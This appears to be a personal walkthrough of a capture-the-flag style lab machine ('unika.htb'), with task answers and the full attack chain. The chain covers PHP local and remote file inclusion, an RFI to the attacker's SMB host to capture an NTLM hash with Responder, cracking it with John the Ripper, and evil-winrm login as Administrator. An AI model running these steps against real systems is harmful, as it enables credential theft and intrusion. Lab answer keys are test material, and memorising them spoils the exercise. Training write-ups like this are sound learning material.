## 1. Questions
- Task 1
	- When visiting the web service using the IP address, what is the domain that we are being redirected to?
		- `unika.htb`
- Task 2
	- Which scripting language is being used on the server to generate webpages?
		- `php`
- Task 3
	- What is the name of the URL parameter which is used to load different language versions of the webpage?
		- `page`
- Task 4
	- Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
		- `"../../../../../../../../windows/system32/drivers/etc/hosts"`
- Task 5
	- Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"
		- `"//10.10.14.6/somefile"`
- Task 6
	- What does NTLM stand for?
		- `New Technology LAN Manager`
- Task 7
	- Which flag do we use in the Responder utility to specify the network interface?
		- `-I`
- Task 8
	- There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?.
		- `John the Ripper`
- Task 9
	- What is the password for the administrator user?
		- `badminton`
- Task 10
	- We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?
		- `5985`
- Submit Flag
	- Submit root flag
## 2. Tools Used
- Linux
- CLI
- nmap
- curl
- nslookup
- echo
- tee
- netcat
- responder
- john the ripper
- evil-winrm
- PowerShell
- ls
- cat
## 3. Approach
### nmap scan
- Useful resource
	- https://www.stationx.net/nmap-cheat-sheet/
```bash
sudo nmap -sSVC -Pn -n --disable-arp-ping -T4 10.129.57.200
```
- Flags
	- `-sSVC` - SYN, service, and default sript scan.
	- `-Pn` - Exclude ICMP scanning.
	- `-n` - Exclude name resolution.
	- `--disable-arp-ping` - Exclude `arp` scanning.
	- `-T4` - Use speed template `aggressive`.
- Result
```bash
<snip>
PORT     STATE SERVICE    VERSION
80/tcp   open  http       Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
5985/tcp open  http       Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
7680/tcp open  pando-pub?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
<snip>
```
### Get more information on ports 5985 and 7680
- Useful resources
	- https://www.speedguide.net/port.php?port=5985
	- https://www.speedguide.net/port.php?port=7680
	- https://nmap.org/book/man-nse.html
	- https://nmap.org/nsedoc/scripts/banner.html
```bash
nmap --script=banner -p 5985,7680 10.129.57.200
```
- Result
```bash
PORT     STATE    SERVICE
5985/tcp open     wsman
7680/tcp filtered pando-pub
```
### Test webserver response
- Useful resource
	- https://devhints.io/curl
#### curl
```bash
curl -i http://10.129.57.200
```
- Key element
```html
<meta http-equiv="refresh" content="0;url=http://unika.htb/">
```
### Test webserver redirect response
- Useful resource
	- https://devhints.io/curl
#### curl
```bash
curl -i http://unika.htb/
```
- Key element
```html
curl: (6) Could not resolve host: unika.htb
```
#### Browser
![[Screenshot 2025-08-20 at 08.51.44.png]]
### Add static name resolution entry
- Useful resource
	- https://tldp.org/LDP/solrhe/Securing-Optimizing-Linux-RH-Edition-v1.3/chap9sec95.html
```bash
echo "10.129.57.200 unika.htb" | sudo tee -a /etc/hosts
```
### Retest webserver response
- Useful resource
	- https://devhints.io/curl
#### curl
```bash
curl -i http://unika.htb/
```
#### Browser
![[Screenshot 2025-08-20 at 10.41.36.png]]
### Explore webpage content
- Most content has no discernible value
- Key result
```bash
http://unika.htb/index.php?page=french.html
```
### Test parameter tampering response
- Useful resource
	- https://owasp.org/www-community/attacks/Web_Parameter_Tampering
- Test query parameter
	- `test`
- Key result elements
	- `C:\xampp\htdocs\index.php`
		- Windows file path
		- `xampp` stack
			- Apache
			- MariaDB
			- php
			- Perl
	- `include` function directly using user input
![](Screenshot%202025-09-14%20at%2013.52.25.png)
### Test LFD vulnerability
- Useful resource
	- https://medium.com/@zoningxtr/local-file-disclosure-lfd-attacks-explained-the-silent-data-leak-you-never-saw-coming-f473f73a05fb
	- https://systemweakness.com/local-file-disclosure-via-path-traversal-one-workflow-to-rule-them-all-69dc5f1335bd
	- https://gist.github.com/SleepyLctl/823c4d29f834a71ba995238e80eb15f9
- Test path (known Windows file)
	- `C:\Windows\win.ini`
```bash
http://unika.htb/index.php?page=C:\Windows\win.ini
```
- Successfully returned the file's contents
![](Screenshot%202025-09-14%20at%2009.52.00.png)
### Test php wrappers
- Useful resources
	- https://www.php.net/manual/en/wrappers.php
	- https://www.cobalt.io/blog/a-pentesters-guide-to-file-inclusion#:~:text=File%20Inclusion%20Cheatsheet
- Disabled wrappers
	- `data://`
	- `http://`
	- `https://`
	- `ftp://`
	- `zlib://`
	- `ssh2://`
	- `expect://`
- Enabled wrappers
	- `php://`
	- `file://`
### Test for LFI vulnerability
- Useful resource
	- https://www.cobalt.io/blog/a-pentesters-guide-to-file-inclusion#:~:text=File%20Inclusion%20Cheatsheet
```bash
curl -i http://unika.htb/index.php?page=php://filter/convert.base64-encode/resource=index.php
```
- Result
```bash
PD9waHAgDQokZG9tYWluID0gInVuaWthLmh0YiI7DQppZigkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSAhPSAkZG9tYWluKSB7DQogIGVjaG8gJzxtZXRhIGh0dHAtZXF1aXY9InJlZnJlc2giIGNvbnRlbnQ9IjA7dXJsPWh0dHA6Ly91bmlrYS5odGIvIj4nOw0KICBkaWUoKTsNCn0NCmlmKCFpc3NldCgkX0dFVFsncGFnZSddKSkgew0KICBpbmNsdWRlKCIuL2VuZ2xpc2guaHRtbCIpOw0KfQ0KZWxzZSB7DQogIGluY2x1ZGUoJF9HRVRbJ3BhZ2UnXSk7DQp9
```
### Review vulnerable php code
```bash
echo "PD9waHAgDQokZG9tYWluID0gInVuaWthLmh0YiI7DQppZigkX1NFUlZFUlsnU0VSVkVSX05BTUUnXSAhPSAkZG9tYWluKSB7DQogIGVjaG8gJzxtZXRhIGh0dHAtZXF1aXY9InJlZnJlc2giIGNvbnRlbnQ9IjA7dXJsPWh0dHA6Ly91bmlrYS5odGIvIj4nOw0KICBkaWUoKTsNCn0NCmlmKCFpc3NldCgkX0dFVFsncGFnZSddKSkgew0KICBpbmNsdWRlKCIuL2VuZ2xpc2guaHRtbCIpOw0KfQ0KZWxzZSB7DQogIGluY2x1ZGUoJF9HRVRbJ3BhZ2UnXSk7DQp9" | base64 -d
```
- Result
```php
<?php 
$domain = "unika.htb";
if($_SERVER['SERVER_NAME'] != $domain) {
  echo '<meta http-equiv="refresh" content="0;url=http://unika.htb/">';
  die();
}
if(!isset($_GET['page'])) {
  include("./english.html");
}
else {
  include($_GET['page']);
}
```
### Test RFI vulnerability
- Useful resources
	- https://cwe.mitre.org/data/definitions/40.html
	- https://learn.microsoft.com/en-us/dotnet/standard/io/file-path-formats#unc-paths
	- https://learn.microsoft.com/en-us/windows/win32/fileio/microsoft-smb-protocol-and-cifs-protocol-overview
	- https://quickref.me/nc.html
	- https://quickref.me/grep.html
#### Terminal 1: Start netcat listener
```bash
sudo nc -lnvp 445
```
#### Terminal 2: Send request
- Use `tun0` IPv4 address
```bash
curl http://unika.htb/index.php?page=//10.10.14.85/test
```
- Result
```bash
E�SMBrS�����"NT LM 0.12SMB 2.002SMB 2.???^C
```
### Capture NTLM hash
- https://en.wikipedia.org/wiki/Server_Message_Block
- https://en.wikipedia.org/wiki/NTLM
- https://github.com/SpiderLabs/Responder
- https://www.vaadata.com/blog/understanding-ntlm-authentication-and-ntlm-relay-attacks/
#### Terminal 1: Start responder listener
```bash
sudo responder -I tun0
```
#### Terminal 2: Send request
- Use `tun0` IPv4 address
```bash
curl http://unika.htb/index.php?page=//10.10.14.85/test
```
- Key results
	- Username: `Administrator`
	- Hash: `Administrator::RESPONDER:0922b8cb80ee2c78:74E241EFED3D88A9B432075D19220F69:01010000000000008058D1C87025DC01C4533364BDCE09B500000000020008004B00590055005A0001001E00570049004E002D004A0032003800460038005300330034004C003200550004003400570049004E002D004A0032003800460038005300330034004C00320055002E004B00590055005A002E004C004F00430041004C00030014004B00590055005A002E004C004F00430041004C00050014004B00590055005A002E004C004F00430041004C00070008008058D1C87025DC010600040002000000080030003000000000000000010000000020000083B88D0499F1B16F89FF63161D6998BEFF8FFB7E5B3B8CACC41025A542B1FBA80A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380035000000000000000000`
### Copy the hash to a file
```bash
echo "Administrator::RESPONDER:0922b8cb80ee2c78:74E241EFED3D88A9B432075D19220F69:01010000000000008058D1C87025DC01C4533364BDCE09B500000000020008004B00590055005A0001001E00570049004E002D004A0032003800460038005300330034004C003200550004003400570049004E002D004A0032003800460038005300330034004C00320055002E004B00590055005A002E004C004F00430041004C00030014004B00590055005A002E004C004F00430041004C00050014004B00590055005A002E004C004F00430041004C00070008008058D1C87025DC010600040002000000080030003000000000000000010000000020000083B88D0499F1B16F89FF63161D6998BEFF8FFB7E5B3B8CACC41025A542B1FBA80A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00380035000000000000000000" > hash
```
### Crack the hash
- Useful resource
	- https://www.rippling.com/blog/password-cracker#:~:text=your%20specific%20defenses.-,6%20password%20cracker%20tools,-When%20it%20comes
	- https://en.wikipedia.org/wiki/John_the_Ripper
	- https://github.com/openwall/john
```bash
john -w:/usr/share/wordlists/rockyou.txt hash
```
- Result
```bash
badminton        (Administrator) 
```
### Test winrm connection
- Useful resource
	- https://learn.microsoft.com/en-us/windows/win32/winrm/portal
	- https://en.wikipedia.org/wiki/Windows_Remote_Management
	- https://github.com/Hackplayers/evil-winrm
- Successfully connected using username `Administrator` and password `badminton`
```bash
evil-winrm  -i 10.129.57.200 -u Administrator -p 'badminton'
```
### Explore files and directories
- Flag found in `C:\Users\mike\Desktop`
### Retrieve the flag
```powershell
Get-Content C:\Users\mike\Desktop\flag.txt
cat C:\Users\mike\Desktop\flag.txt
```
